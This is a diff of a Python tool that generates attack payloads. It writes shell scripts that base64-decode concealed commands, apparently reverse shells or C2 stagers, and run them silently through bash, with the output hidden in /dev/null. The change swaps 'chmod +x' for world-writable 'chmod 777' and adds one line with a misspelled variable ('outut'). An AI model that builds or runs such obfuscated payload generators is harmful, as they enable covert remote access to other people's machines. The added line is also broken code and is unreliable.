@@ -79,6 +79,7 @@ if payload=="a" or payload=="A":
 	f=open(f"{output}/{name}.sh","w+")
 	f.write(f"echo -e '\033[1;38m {additional}' && base64 -d <<< {encodedrshells} | bash")
 	f.close()
+	os.system(f"chmod 777 {outut}/{name}.sh")
 elif payload=="1":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
@@ -88,7 +89,7 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
-		os.system(f"chmod +x {output}/{name}.sh ")
+		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="2":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
@@ -98,7 +99,7 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
-		os.system(f"chmod +x {output}/{name}.sh ")
+		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="3":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
@@ -109,7 +110,7 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 		""")
 		f.write(s)
 		f.write(s)
-		os.system(f"chmod +x {output}/{name}.sh ")
+		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="4":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
@@ -119,7 +120,7 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
-		os.system(f"chmod +x {output}/{name}.sh ")
+		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="5":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
@@ -129,7 +130,7 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
-		os.system(f"chmod +x {output}/{name}.sh ")
+		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="6":
 	print(f"GENERATING PAYLOAD {output}/{name}.py ")
 	pyload=(f"""import os
@@ -232,7 +233,7 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
-		os.system(f"chmod +x {output}/{name}.sh ")
+		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="12":
 	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
@@ -245,7 +246,7 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
-		os.system(f"chmod +x {output}/{name}.sh ")
+		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="13":
 	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
@@ -258,7 +259,7 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
-		os.system(f"chmod +x {output}/{name}.sh ")
+		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="14":
 	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
@@ -271,7 +272,7 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
-		os.system(f"chmod +x {output}/{name}.sh ")
+		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="15":
 	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
@@ -284,7 +285,7 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
-		os.system(f"chmod +x {output}/{name}.sh ")
+		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="16":
 	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
@@ -297,7 +298,7 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
-		os.system(f"chmod +x {output}/{name}.sh ")
+		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="L":
 	print("""\033[1;36m 
 ███████╗██████╗ 
